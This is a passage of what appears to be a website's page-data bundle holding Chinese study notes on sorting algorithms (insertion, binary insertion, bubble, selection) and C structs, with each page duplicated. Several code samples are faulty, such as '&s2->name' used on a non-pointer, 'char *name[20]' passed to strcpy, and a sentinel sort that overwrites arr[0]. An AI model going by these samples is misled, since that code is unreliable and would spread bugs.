这种就是把下表为0的元素当做哨兵，这样就不用每次都判断j>=0了 个人认为没啥必要\nvoid insertSort(int *arr, int length) {\n    int i, j;\n    // 从第二个元素开始，因为第一个元素默认是有序的\n    for (i = 2; i < length; ++i) {\n        // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n        if (arr[i] < arr[i - 1]) {\n            // 将当前元素插入到合适的位置\n            arr[0] = arr[i];\n            // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移一位\n            for (j = i - 1; arr[j] > arr[0]; --j) {\n                arr[j + 1] = arr[j];\n            }\n            // 将当前元素插入到合适的位置\n            arr[j + 1] = arr[0];\n\n        }\n    }\n}\n\n\n\n\n# 算法分析\n\n\n# 时间复杂度\n\n> 最好情况：O(n)\n\n * 一般就是有序的 是不需要移动的 也是常数级别的\n\n> 最坏情况：O(n^2)\n\n * 一般就是逆序的，每一项都需要移动\n\n> 平均情况：O(n^2)\n\n\n# 空间复杂度\n\n> O(1)\n\n\n# 稳定性\n\n> 稳定\n\n\n# 折半插入排序\n\n> 也叫二分插入排序，是对直接插入排序算法的一种改进，由于排序过程中，前面的元素总是已经排好序的，所以可以使用折半查找的方式来减少比较次数，提高效率。\n\n * 只能用于顺序存储结构，不适用于链式存储结构。顺序查找支持下表随时访问\n * 个人认为 时间复杂度还是O(n^2) 就是少了一些比较次数\n\n  // 代码实现\n  void binaryInsertSort(int *arr, int length) {\n      int i, j, temp, low, high, mid;\n      // 从第二个元素开始，因为第一个元素默认是有序的\n      for (i = 1; i < length; ++i) {\n          // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n          if (arr[i] < arr[i - 1]) {\n              // 保存当前元素\n              temp = arr[i];\n              // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移一位\n              low = 0;\n              high = i - 1;\n              while (low <= high) {\n                  mid = (low + high) / 2;\n                  if (arr[mid] > temp) {\n                      high = mid - 1;\n                  } else {\n                      low = mid + 1;\n                  }\n              }\n              // 将当前元素插入到合适的位置\n              for (j = i - 1; j >= high + 1; --j) {\n                  arr[j + 1] = arr[j];\n              }\n              arr[high + 1] = temp;\n  \n          }\n      }\n  }\n",normalizedContent:"# 插入排序\n\n\n# 算法思想\n\n> 每次将一个待排序的记录，按其关键字大小插入到前面已经排好序的子序列中的适当位置，直到全部记录插入完成为止。\n\n// 举例\nint arr[] = { 3, 1, 5, 7, 2, 4, 9, 6 };\n\n// 第一轮替换\nint arr[] = { 1, 3, 5, 7, 2, 4, 9, 6 };\n\n// 第二轮替换\nint arr[] = { 1, 2, 3, 5, 7, 4, 9, 6 };\n\n// 第三轮替换\nint arr[] = { 1, 2, 3, 4, 5, 7, 9, 6 };\n\n// 第四轮替换\nint arr[] = { 1, 2, 3, 4, 5, 6, 7, 9 };\n\n// 代码实现 \nvoid insertsort(int *arr, int length) {\n    int i, j, temp;\n    // 从第二个元素开始，因为第一个元素默认是有序的\n    for (i = 1; i < length; ++i) {\n        // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n        if (arr[i] < arr[i - 1]) {\n            // 保存当前元素\n            temp = arr[i];\n            // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移一位\n            for (j = i - 1; j >= 0 && arr[j] > temp; --j) {\n              //这里将大于temp的数都后移一位\n                arr[j + 1] = arr[j];\n            }\n            // 将当前元素插入到合适的位置\n            arr[j + 1] = temp;\n\n        }\n    }\n}\n\n//第二种实现方式 （这种方式比较好理解）\nvoid insertsort(int *arr, int length) {\n    int i, j, temp;\n    // 从第二个元素开始，因为第一个元素默认是有序的\n    for (i = 1; i < length; ++i) {\n        // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n        if (arr[i] < arr[i - 1]) {\n            // 保存当前元素\n            temp = arr[i];\n            // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移一位\n            for (j = i - 1; j >= 0; --j) {\n                if (arr[j] > temp) {\n                    arr[j + 1] = arr[j];\n                } else {\n                    break;\n                }\n            }\n            // 将当前元素插入到合适的位置\n            arr[j + 1] = temp;\n\n        }\n    }\n}\n\n// 第三种实现方式 (带哨兵) 这种就是把下表为0的元素当做哨兵，这样就不用每次都判断j>=0了 个人认为没啥必要\nvoid insertsort(int *arr, int length) {\n    int i, j;\n    // 从第二个元素开始，因为第一个元素默认是有序的\n    for (i = 2; i < length; ++i) {\n        // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n        if (arr[i] < arr[i - 1]) {\n            // 将当前元素插入到合适的位置\n            arr[0] = arr[i];\n            // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移一位\n            for (j = i - 1; arr[j] > arr[0]; --j) {\n                arr[j + 1] = arr[j];\n            }\n            // 将当前元素插入到合适的位置\n            arr[j + 1] = arr[0];\n\n        }\n    }\n}\n\n\n\n\n# 算法分析\n\n\n# 时间复杂度\n\n> 最好情况：o(n)\n\n * 一般就是有序的 是不需要移动的 也是常数级别的\n\n> 最坏情况：o(n^2)\n\n * 一般就是逆序的，每一项都需要移动\n\n> 平均情况：o(n^2)\n\n\n# 空间复杂度\n\n> o(1)\n\n\n# 稳定性\n\n> 稳定\n\n\n# 折半插入排序\n\n> 也叫二分插入排序，是对直接插入排序算法的一种改进，由于排序过程中，前面的元素总是已经排好序的，所以可以使用折半查找的方式来减少比较次数，提高效率。\n\n * 只能用于顺序存储结构，不适用于链式存储结构。顺序查找支持下表随时访问\n * 个人认为 时间复杂度还是o(n^2) 就是少了一些比较次数\n\n  // 代码实现\n  void binaryinsertsort(int *arr, int length) {\n      int i, j, temp, low, high, mid;\n      // 从第二个元素开始，因为第一个元素默认是有序的\n      for (i = 1; i < length; ++i) {\n          // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n          if (arr[i] < arr[i - 1]) {\n              // 保存当前元素\n              temp = arr[i];\n              // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移一位\n              low = 0;\n              high = i - 1;\n              while (low <= high) {\n                  mid = (low + high) / 2;\n                  if (arr[mid] > temp) {\n                      high = mid - 1;\n                  } else {\n                      low = mid + 1;\n                  }\n              }\n              // 将当前元素插入到合适的位置\n              for (j = i - 1; j >= high + 1; --j) {\n                  arr[j + 1] = arr[j];\n              }\n              arr[high + 1] = temp;\n  \n          }\n      }\n  }\n",charsets:{cjk:!0}},{title:"冒泡排序",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/03-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F.html",relativePath:"数据结构/排序/03-冒泡排序.md",key:"v-73512eb8",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/03-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F.html",headers:[{level:2,title:"基本思想",slug:"基本思想",normalizedTitle:"基本思想",charIndex:78},{level:2,title:"算法分析",slug:"算法分析",normalizedTitle:"算法分析",charIndex:1585},{level:3,title:"空间复杂度",slug:"空间复杂度",normalizedTitle:"空间复杂度",charIndex:1594},{level:3,title:"时间复杂度",slug:"时间复杂度",normalizedTitle:"时间复杂度",charIndex:1612},{level:3,title:"稳定性",slug:"稳定性",normalizedTitle:"稳定性",charIndex:1824},{level:2,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:1856}],headersStr:"基本思想 算法分析 空间复杂度 时间复杂度 稳定性 其他",content:"# 冒泡排序\n\n> 基于交换排序，根据序列中两个元素关键字的对比结果来对换这两个记录在序列中的位置，当两个元素的关键字相等时，它们的相对位置不变。\n\n\n# 基本思想\n\n> 从前往后或者从后往前 两两对比相邻元素的值，若为逆序 则交换他们的位置，直到序列比较完毕。\n\n\nint arr = {9,1,2,5,7,4,8,6,3,5};\n\n//举例从左到右的冒泡排序\n//第一组\n//第一轮比较 比较下表为0和1的两个元素 9和1 9>1 交换位置\nint arr = {1,9,2,5,7,4,8,6,3,5};\n\n//第二轮比较 比较下表为1和2的两个元素 9和2 9>2 交换位置\nint arr = {1,2,9,5,7,4,8,6,3,5};\n\n//第三轮比较 比较下表为2和3的两个元素 9和5 9>5 交换位置\nint arr = {1,2,5,9,7,4,8,6,3,5};\n\n//第四轮比较 比较下表为3和4的两个元素 9和7 9>7 交换位置\nint arr = {1,2,5,7,9,4,8,6,3,5};\n\n// ... 依次类推 第一组比较完毕\nint arr = {1,2,5,7,4,8,6,3,5,9};\n\n//第二组\n//第一轮比较 这里注意：无需比较下表为0和1的两个元素 直接比较下表为1和2的两个元素 2和5 2<5 不交换位置\n\n//... 依次类推 第二组比较完毕\n  \n\n    //代码实现\n void bubbleSort(int *arr, int length) {\n\n  //从右到左的冒泡排序\n   for (int i = 0; i < length - 1; ++i) {\n       bool flag = false;\n       for (int j = length - 1; j > i; --j) {\n           if (arr[j] < arr[j - 1]) {\n               flag = true;\n               int temp = arr[j];\n               arr[j] = arr[j - 1];\n               arr[j - 1] = temp;\n           }\n       }\n       if (flag==false) {\n           return;\n       }\n   }\n\n    //从左到右的冒泡排序\n    //循环对比的次数\n    for (int i = 0; i < length - 1; ++i) {\n        bool flag = false;\n        //每次循环都会将最大的数放到最后 所以每次循环都会减少一个数\n        for (int j = 0; j < length - i - 1; ++j) {\n            //如果前一个数比后一个数大 则交换位置\n            if (arr[j + 1] < arr[j]) {\n                int temp = arr[j + 1];\n                arr[j + 1] = arr[j];\n                arr[j] = temp;\n                flag = true;\n            }\n\n        }\n        //这里注意的是 如果一次循环下来 没有发生交换 则说明已经是有序的了 直接返回\n        if (flag == false) {\n            return;\n        }\n    }\n}\n\n\n\n# 算法分析\n\n\n# 空间复杂度\n\n> O(1)\n\n\n# 时间复杂度\n\n> 最好情况下 O(n) 比较次数为 n-1，交换次数为 0\n\n * 一般就是有序的 是不需要移动的 也是常数级别的\n\n> 最坏情况下 O(n^2) 比较次数为 n(n-1)/2，交换次数为 n(n-1)/2。(N-1)+(N-2)+...+1=N(N-1)/2。\n\n * 一般就是逆序的，每一项都需要移动\n\n> 平均情况下 O(n^2) 比较次数为 n(n-1)/2，交换次数为 n(n-1)/2。\n\n\n# 稳定性\n\n> 稳定\n\n * 两个相等的元素不会交换位置\n\n\n# 其他\n\n> 可以使用链表来实现冒泡排序，这样就不需要交换元素，只需要改变指针的指向即可。因为冒泡排序不需要随机访问元素，所以链表实现的冒泡排序也是一种很好的思路。",normalizedContent:"# 冒泡排序\n\n> 基于交换排序，根据序列中两个元素关键字的对比结果来对换这两个记录在序列中的位置，当两个元素的关键字相等时，它们的相对位置不变。\n\n\n# 基本思想\n\n> 从前往后或者从后往前 两两对比相邻元素的值，若为逆序 则交换他们的位置，直到序列比较完毕。\n\n\nint arr = {9,1,2,5,7,4,8,6,3,5};\n\n//举例从左到右的冒泡排序\n//第一组\n//第一轮比较 比较下表为0和1的两个元素 9和1 9>1 交换位置\nint arr = {1,9,2,5,7,4,8,6,3,5};\n\n//第二轮比较 比较下表为1和2的两个元素 9和2 9>2 交换位置\nint arr = {1,2,9,5,7,4,8,6,3,5};\n\n//第三轮比较 比较下表为2和3的两个元素 9和5 9>5 交换位置\nint arr = {1,2,5,9,7,4,8,6,3,5};\n\n//第四轮比较 比较下表为3和4的两个元素 9和7 9>7 交换位置\nint arr = {1,2,5,7,9,4,8,6,3,5};\n\n// ... 依次类推 第一组比较完毕\nint arr = {1,2,5,7,4,8,6,3,5,9};\n\n//第二组\n//第一轮比较 这里注意：无需比较下表为0和1的两个元素 直接比较下表为1和2的两个元素 2和5 2<5 不交换位置\n\n//... 依次类推 第二组比较完毕\n  \n\n    //代码实现\n void bubblesort(int *arr, int length) {\n\n  //从右到左的冒泡排序\n   for (int i = 0; i < length - 1; ++i) {\n       bool flag = false;\n       for (int j = length - 1; j > i; --j) {\n           if (arr[j] < arr[j - 1]) {\n               flag = true;\n               int temp = arr[j];\n               arr[j] = arr[j - 1];\n               arr[j - 1] = temp;\n           }\n       }\n       if (flag==false) {\n           return;\n       }\n   }\n\n    //从左到右的冒泡排序\n    //循环对比的次数\n    for (int i = 0; i < length - 1; ++i) {\n        bool flag = false;\n        //每次循环都会将最大的数放到最后 所以每次循环都会减少一个数\n        for (int j = 0; j < length - i - 1; ++j) {\n            //如果前一个数比后一个数大 则交换位置\n            if (arr[j + 1] < arr[j]) {\n                int temp = arr[j + 1];\n                arr[j + 1] = arr[j];\n                arr[j] = temp;\n                flag = true;\n            }\n\n        }\n        //这里注意的是 如果一次循环下来 没有发生交换 则说明已经是有序的了 直接返回\n        if (flag == false) {\n            return;\n        }\n    }\n}\n\n\n\n# 算法分析\n\n\n# 空间复杂度\n\n> o(1)\n\n\n# 时间复杂度\n\n> 最好情况下 o(n) 比较次数为 n-1，交换次数为 0\n\n * 一般就是有序的 是不需要移动的 也是常数级别的\n\n> 最坏情况下 o(n^2) 比较次数为 n(n-1)/2，交换次数为 n(n-1)/2。(n-1)+(n-2)+...+1=n(n-1)/2。\n\n * 一般就是逆序的，每一项都需要移动\n\n> 平均情况下 o(n^2) 比较次数为 n(n-1)/2，交换次数为 n(n-1)/2。\n\n\n# 稳定性\n\n> 稳定\n\n * 两个相等的元素不会交换位置\n\n\n# 其他\n\n> 可以使用链表来实现冒泡排序，这样就不需要交换元素，只需要改变指针的指向即可。因为冒泡排序不需要随机访问元素，所以链表实现的冒泡排序也是一种很好的思路。",charsets:{cjk:!0}},{title:"简单排序",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/05-%E7%AE%80%E5%8D%95%E6%8E%92%E5%BA%8F.html",relativePath:"数据结构/排序/05-简单排序.md",key:"v-4e8396ae",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/05-%E7%AE%80%E5%8D%95%E6%8E%92%E5%BA%8F.html",headers:[{level:2,title:"基本思想",slug:"基本思想",normalizedTitle:"基本思想",charIndex:47},{level:2,title:"算法分析",slug:"算法分析",normalizedTitle:"算法分析",charIndex:867},{level:3,title:"空间复杂度",slug:"空间复杂度",normalizedTitle:"空间复杂度",charIndex:876},{level:3,title:"时间复杂度",slug:"时间复杂度",normalizedTitle:"时间复杂度",charIndex:892}],headersStr:"基本思想 算法分析 空间复杂度 时间复杂度",content:"# 简单排序\n\n> 每一趟在待排序元素中选取关键字最小（或最大）的元素加入有序子序列\n\n\n# 基本思想\n\n> 从待排序序列中，找到关键字最小的元素；交换到序列的最前面(有序子序列的最后面)。下次循环，再从剩余的待排序元素中继续寻找最小的元素，放到有序子序列的最后面。以此类推，直到全部待排序的数据元素排完。\n\nint arr = {9,1,2,5,7,4,8,6,3,5};\n\n//第一躺简单排序 扫描数组中最小的值 与第一个元素交换位置\nint arr = {1,9,2,5,7,4,8,6,3,5};\n\n//第二躺简单排序 因为第一个元素已经是最小的了 所以从第二个元素开始扫描 找到最小的值 与第二个元素交换位置\n\n//... 依次类推\n\n//代码实现\n\nvoid selectSort(int *arr, int length) {\n    int i, j, min, temp;\n    // 循环比较的次数\n    for (i = 0; i < length - 1; ++i) {\n        // 保存当前循环的下标\n        min = i;\n        // 从当前元素的下一个元素开始，依次和当前元素比较，如果比当前元素小，那么就将该元素的下标保存到min中\n        for (j = i + 1; j < length; ++j) {\n            if (arr[j] < arr[min]) {\n                min = j;\n            }\n        }\n        // 如果min不等于i，那么就说明找到了比当前元素更小的元素，那么就将这两个元素交换位置\n        if (min != i) {\n            temp = arr[i];\n            arr[i] = arr[min];\n            arr[min] = temp;\n        }\n    }\n}\n\n\n\n# 算法分析\n\n\n# 空间复杂度\n\nO(1)\n\n\n# 时间复杂度\n\n无论是否有序，都需要进行 n(n-1)/2 次比较，时间复杂度为 O(n^2) O(n^2)",normalizedContent:"# 简单排序\n\n> 每一趟在待排序元素中选取关键字最小（或最大）的元素加入有序子序列\n\n\n# 基本思想\n\n> 从待排序序列中，找到关键字最小的元素；交换到序列的最前面(有序子序列的最后面)。下次循环，再从剩余的待排序元素中继续寻找最小的元素，放到有序子序列的最后面。以此类推，直到全部待排序的数据元素排完。\n\nint arr = {9,1,2,5,7,4,8,6,3,5};\n\n//第一躺简单排序 扫描数组中最小的值 与第一个元素交换位置\nint arr = {1,9,2,5,7,4,8,6,3,5};\n\n//第二躺简单排序 因为第一个元素已经是最小的了 所以从第二个元素开始扫描 找到最小的值 与第二个元素交换位置\n\n//... 依次类推\n\n//代码实现\n\nvoid selectsort(int *arr, int length) {\n    int i, j, min, temp;\n    // 循环比较的次数\n    for (i = 0; i < length - 1; ++i) {\n        // 保存当前循环的下标\n        min = i;\n        // 从当前元素的下一个元素开始，依次和当前元素比较，如果比当前元素小，那么就将该元素的下标保存到min中\n        for (j = i + 1; j < length; ++j) {\n            if (arr[j] < arr[min]) {\n                min = j;\n            }\n        }\n        // 如果min不等于i，那么就说明找到了比当前元素更小的元素，那么就将这两个元素交换位置\n        if (min != i) {\n            temp = arr[i];\n            arr[i] = arr[min];\n            arr[min] = temp;\n        }\n    }\n}\n\n\n\n# 算法分析\n\n\n# 空间复杂度\n\no(1)\n\n\n# 时间复杂度\n\n无论是否有序，都需要进行 n(n-1)/2 次比较，时间复杂度为 o(n^2) o(n^2)",charsets:{cjk:!0}},{title:"结构体",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/07-%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B.html",relativePath:"数据结构/C语言程序设计/07-复合类型.md",key:"v-6a8af3a8",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/07-%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B.html",headers:[{level:2,title:"结构体",slug:"结构体",normalizedTitle:"结构体",charIndex:2},{level:3,title:"结构体的定义和初始化",slug:"结构体的定义和初始化",normalizedTitle:"结构体的定义和初始化",charIndex:479},{level:3,title:"结构体成员的使用",slug:"结构体成员的使用",normalizedTitle:"结构体成员的使用",charIndex:1704},{level:3,title:"结构体数组",slug:"结构体数组",normalizedTitle:"结构体数组",charIndex:2485},{level:3,title:"结构体互相嵌套",slug:"结构体互相嵌套",normalizedTitle:"结构体互相嵌套",charIndex:3301},{level:3,title:"结构体赋值",slug:"结构体赋值",normalizedTitle:"结构体赋值",charIndex:4206},{level:3,title:"结构体指针",slug:"结构体指针",normalizedTitle:"结构体指针",charIndex:4686},{level:3,title:"结构体做函数参数",slug:"结构体做函数参数",normalizedTitle:"结构体做函数参数",charIndex:6322},{level:2,title:"共用体(联合体)",slug:"共用体-联合体",normalizedTitle:"共用体(联合体)",charIndex:9034},{level:2,title:"枚举",slug:"枚举",normalizedTitle:"枚举",charIndex:9577},{level:2,title:"typedef",slug:"typedef",normalizedTitle:"typedef",charIndex:1116}],headersStr:"结构体 结构体的定义和初始化 结构体成员的使用 结构体数组 结构体互相嵌套 结构体赋值 结构体指针 结构体做函数参数 共用体(联合体) 枚举 typedef",content:'# 结构体\n\n> C语言中的结构体是一种构造数据类型，它可以存储不同类型的数据项，这些数据项可以是基本数据类型，也可以是构造数据类型，甚至可以是结构体类型。\n\n示例\n\n#include <stdio.h>\n\nstruct MyStruct\n{\n    int a;\n    char b;\n    float c;\n};\n\nint main(){\n\n    struct MyStruct s1 = {1, \'a\', 1.1};\n    struct MyStruct s2 = {2, \'b\', 2.2};\n\n    printf("s1.a = %d\\n", s1.a);\n    printf("s1.b = %c\\n", s1.b);\n    printf("s1.c = %f\\n", s1.c);\n\n    printf("s2.a = %d\\n", s2.a);\n    printf("s2.b = %c\\n", s2.b);\n    printf("s2.c = %f\\n", s2.c);\n\n    return 0;\n\n}\n\n\n\n\n# 结构体的定义和初始化\n\n定义结构体变量的方式：\n\n * struct 结构体类型名 变量名;\n * struct 结构体类型名 变量名 = {成员1的初始值, 成员2的初始值, ...};\n * 直接定义结构体变量的成员(无需结构体类型名)\n\n示例：\n\n#include <stdio.h>\n\n// `struct 结构体类型名 变量名;`\n\nstruct MyStruct1\n{\n\n    int a;\n    char b;\n    float c;\n\n}; \nstruct MyStruct1 s0; \n\n// `struct 结构体类型名 变量名 = {成员1的初始值, 成员2的初始值, ...};`\n\nstruct MyStruct2\n{\n\n    int a;\n    char b;\n    float c;\n\n} s1 = {1, \'a\', 1.1}; \n\n// 直接定义结构体变量的成员(无需结构体类型名)\nstruct\n{\n\n    int a;\n    char b;\n    float c;\n\n} s2 = {2, \'b\', 2.2}; \n\n\n\n结构体类型和结构体变量关系\n\n * 结构体类型：指定一个结构体的类型，可以定义多个结构体变量。没有具体数据，只是一个模板。系统也不分配内存。\n * 结构体变量：根据结构体类型定义的变量，有具体的数据，系统会分配内存。\n\n结构体类型定义的方式\n\n * struct 结构体类型名 {成员列表};\n * typedef struct 结构体类型名 {成员列表} 结构体类型别名;\n\n示例：\n\n#include <stdio.h>\n\n// `struct 结构体类型名 {成员列表};`\n\nstruct MyStruct1\n{\n\n    int a;\n    char b;\n    float c;\n\n};\n\n// `typedef struct 结构体类型名 {成员列表} 结构体类型别名;`\n\ntypedef struct MyStruct2\n{\n\n    int a;\n    char b;\n    float c;\n\n} MyStruct2;\n\nint main(){\n\n    struct MyStruct1 s1 = {1, \'a\', 1.1};\n    MyStruct2 s2 = {2, \'b\', 2.2};\n\n    printf("s1.a = %d\\n", s1.a);\n    printf("s1.b = %c\\n", s1.b);\n    printf("s1.c = %f\\n", s1.c);\n\n    printf("s2.a = %d\\n", s2.a);\n    printf("s2.b = %c\\n", s2.b);\n    printf("s2.c = %f\\n", s2.c);\n\n    return 0;\n\n}\n\n\n\n\n# 结构体成员的使用\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体的定义\nstruct Student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\nint main(){\n\n    // 结构体变量的定义\n    struct Student s1 = {"张三", 18, 100};\n    struct Student s2 = {"李四", 19, 90};\n\n    // 结构体变量的使用\n    printf("s1.name = %s\\n", s1.name);\n    printf("s1.age = %d\\n", s1.age);\n    printf("s1.score = %f\\n", s1.score);\n\n    printf("s2.name = %s\\n", s2.name);\n    printf("s2.age = %d\\n", s2.age);\n    printf("s2.score = %f\\n", s2.score);\n\n    // 结构体变量的赋值\n    strcpy(s2.name, "王五");\n    s2.age = 20;\n    s2.score = 80;\n\n    // 如果是指针变量\n    strcpy(&s2->name, "王五");\n    &s2->age = 20;\n\n    printf("s2.name = %s\\n", s2.name);\n    printf("s2.age = %d\\n", s2.age);\n    printf("s2.score = %f\\n", s2.score);\n\n    return 0;\n\n}\n\n\n\n\n# 结构体数组\n\n  #include <stdio.h>\n  #include <string.h>\n\n  // 结构体的定义\n  struct Student\n  {\n\n      char name[20];\n      int age;\n      float score;\n\n  }; \n\n  int main(){\n\n      // 结构体数组的定义\n      struct Student arr[3] = {\n          {"张三", 18, 100},\n          {"李四", 19, 90},\n          {"王五", 20, 80}\n      };\n\n      // 结构体数组的使用\n      for (int i = 0; i < 3; i++)\n      {\n          printf("arr[%d].name = %s\\n", i, arr[i].name);\n          printf("arr[%d].age = %d\\n", i, arr[i].age);\n          printf("arr[%d].score = %f\\n", i, arr[i].score);\n      }\n\n      // 结构体数组的赋值\n      strcpy(arr[2].name, "赵六");\n      arr[2].age = 21;\n      arr[2].score = 70;\n\n      printf("arr[2].name = %s\\n", arr[2].name);\n      printf("arr[2].age = %d\\n", arr[2].age);\n      printf("arr[2].score = %f\\n", arr[2].score);\n\n      return 0;\n\n  }\n\n\n\n\n# 结构体互相嵌套\n\n  #include <stdio.h>\n  #include <string.h>\n\n  // 结构体的定义\n\n  struct Student\n  {\n\n      char name[20];\n      int age;\n      float score;\n\n  };\n\n  struct Teacher\n  {\n\n      int id;\n      char name[20];\n      int age;\n      struct Student stu;\n\n  };\n\n  int main(){\n\n      // 结构体变量的定义\n      struct Teacher t1 = {1, "张三", 30, {"李四", 18, 100}};\n\n      // 结构体变量的使用\n      printf("t1.id = %d\\n", t1.id);\n      printf("t1.name = %s\\n", t1.name);\n      printf("t1.age = %d\\n", t1.age);\n      printf("t1.stu.name = %s\\n", t1.stu.name);\n      printf("t1.stu.age = %d\\n", t1.stu.age);\n      printf("t1.stu.score = %f\\n", t1.stu.score);\n\n      // 结构体变量的赋值\n      strcpy(t1.stu.name, "王五");\n      t1.stu.age = 20;\n      t1.stu.score = 80;\n\n      printf("t1.stu.name = %s\\n", t1.stu.name);\n      printf("t1.stu.age = %d\\n", t1.stu.age);\n      printf("t1.stu.score = %f\\n", t1.stu.score);\n\n      return 0;\n\n  }\n\n\n\n\n# 结构体赋值\n\n> 结构体变量之间可以相互赋值，但是不能相互比较大小\n\n  #include <stdio.h>\n  #include <string.h>\n\n  // 结构体的定义\n  struct Student\n  {\n\n      char name[20];\n      int age;\n      float score;\n\n  };\n\n  int main(){\n\n      // 结构体变量的定义\n      struct Student s1 = {"张三", 18, 100};\n      struct Student s2;\n\n      // 结构体变量的赋值\n      s2 = s1;\n\n      // 结构体变量的使用\n      printf("s2.name = %s\\n", s2.name);\n      printf("s2.age = %d\\n", s2.age);\n      printf("s2.score = %f\\n", s2.score);\n\n      return 0;\n\n  }\n\n\n\n\n# 结构体指针\n\n# 指向普通结构体变量的指针\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\nstruct Student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\nint main(){\n\n    // 结构体变量的定义\n    struct Student s1 = {"张三", 18, 100};\n\n    // 结构体指针的定义\n    struct Student *p = &s1;\n\n    // 结构体指针的使用\n    printf("s1.name = %s\\n", s1.name);\n    printf("s1.age = %d\\n", s1.age);\n    printf("s1.score = %f\\n", s1.score);\n\n    printf("p->name = %s\\n", p->name);\n    printf("p->age = %d\\n", p->age);\n    printf("p->score = %f\\n", p->score);\n\n    printf("(*p).name = %s\\n", (*p).name);\n    printf("(*p).age = %d\\n", (*p).age);\n    printf("(*p).score = %f\\n", (*p).score);\n\n    return 0;\n\n}\n\n\n\n# 堆区结构体变量\n\n  #include <stdio.h>\n  #include <string.h>\n  #include <stdlib.h>\n\n  // 结构体类型的定义\n\n  struct Student\n  {\n\n      char name[20];\n      int age;\n      float score;\n\n  };\n\n  int main(){\n\n      // 结构体指针的定义\n      struct Student *p = malloc(sizeof(struct Student));\n\n      // 结构体指针的使用\n      strcpy(p->name, "张三");\n      p->age = 18;\n      p->score = 100;\n\n      printf("p->name = %s\\n", p->name);\n      printf("p->age = %d\\n", p->age);\n      printf("p->score = %f\\n", p->score);\n\n      return 0;\n\n  }\n\n\n\n# 结构体套一级指针\n\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\n// 结构体类型的定义\nstruct Student\n{\n\n    char *name[20];\n    int age;\n    float score;\n\n};\n\nint main(){\n\n    // 结构体指针的定义\n    struct Student *p = malloc(sizeof(struct Student));\n\n    // 结构体指针的使用\n    strcpy(p->name, "张三");\n    p->age = 18;\n    p->score = 100;\n\n    printf("p->name = %s\\n", p->name);\n    printf("p->age = %d\\n", p->age);\n    printf("p->score = %f\\n", p->score);\n\n    return 0;\n\n}\n\n\n\n\n# 结构体做函数参数\n\n# 结构体普通变量做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\nstruct Student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体变量做函数参数\n\nvoid printStudent(struct Student s){\n\n    printf("s.name = %s\\n", s.name);\n    printf("s.age = %d\\n", s.age);\n    printf("s.score = %f\\n", s.score);\n\n}\n\nint main(){\n\n    // 结构体变量的定义\n    struct Student s1 = {"张三", 18, 100};\n\n    // 结构体变量做函数参数\n    printStudent(s1);\n\n    return 0;\n\n}\n\n\n\n# 结构体指针做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\n\nstruct Student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体指针做函数参数\n\nvoid printStudent(struct Student *p){\n\n    printf("p->name = %s\\n", p->name);\n    printf("p->age = %d\\n", p->age);\n    printf("p->score = %f\\n", p->score);\n\n}\n\nint main(){\n\n    // 结构体变量的定义\n    struct Student s1 = {"张三", 18, 100};\n\n    // 结构体指针做函数参数\n    printStudent(&s1);\n\n    return 0;\n\n}\n\n\n\n# 结构体数组做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\n\nstruct Student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体数组做函数参数\n\nvoid printStudent(struct Student arr[], int len){\n\n    for (int i = 0; i < len; i++)\n    {\n        printf("arr[%d].name = %s\\n", i, arr[i].name);\n        printf("arr[%d].age = %d\\n", i, arr[i].age);\n        printf("arr[%d].score = %f\\n", i, arr[i].score);\n    }\n\n}\n\nint main(){\n\n    // 结构体数组的定义\n    struct Student arr[3] = {\n        {"张三", 18, 100},\n        {"李四", 19, 90},\n        {"王五", 20, 80}\n    };\n\n    // 结构体数组做函数参数\n    printStudent(arr, 3);\n\n    return 0;\n\n}\n\n\n\n# 结构体指针数组做函数参数\n\n\n#include <stdio.h>\n#include <string.h>\n\n// 结构体类型的定义\n\nstruct Student\n{\n\n    char name[20];\n    int age;\n    float score;\n\n};\n\n// 结构体指针数组做函数参数\n\nvoid printStudent(struct Student *arr[], int len){\n\n    for (int i 